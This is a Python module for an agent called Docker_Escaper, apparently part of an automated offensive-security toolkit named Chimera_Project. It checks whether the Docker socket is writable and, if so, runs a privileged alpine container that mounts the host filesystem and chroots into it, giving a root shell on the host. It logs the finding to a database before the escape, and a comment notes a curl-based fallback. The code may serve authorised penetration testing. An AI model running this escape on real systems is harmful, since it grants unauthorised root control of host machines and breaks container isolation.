import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import subprocess
import logging

# The GPS line for project navigation
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Docker_Escaper:
    def __init__(self):
        self.agent_id = "72"
        self.name = "Docker_Escaper"
        self.db = ChimeraDB()
        self.socket_path = "/var/run/docker.sock"

    def check_vulnerability(self):
        """Checks if the Docker socket is accessible from within the container."""
        if os.path.exists(self.socket_path):
            if os.access(self.socket_path, os.W_OK):
                return True
        return False

    def escape_and_capture(self):
        """Attempts to spawn a privileged container that mounts the host OS root."""
        self.logger.warning("[!] VULNERABLE SOCKET DETECTED. Attempting Host Escape...")
        
        # This command starts an alpine container, mounts the HOST / to /host_root
        # then chroots into it. Effectively giving you root on the physical box.
        escape_cmd = [
            "docker", "run", "-it", "--privileged", "--net=host", 
            "-v", "/:/host_root", "alpine", 
            "sh", "-c", "chroot /host_root /bin/sh"
        ]
        
        try:
            # We report the vuln before attempting the interactive escape
            self.db.report_finding(self.name, "Docker_Socket_Exposed", {
                "socket": self.socket_path,
                "severity": "CRITICAL"
            })
            
            # Note: This will only work if 'docker' binary is present in the container
            # If not, we would use 'curl' to talk to the socket API directly.
            subprocess.run(escape_cmd)
        except Exception as e:
            self.logger.error(f"Escape attempt failed: {e}")

    def run(self):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        
        if self.check_vulnerability():
            self.escape_and_capture()
        else:
            self.logger.info("Docker socket not found or not writable. Escape not possible.")
        
        self.db.close()

if __name__ == "__main__":
    agent = Docker_Escaper()
    agent.run()
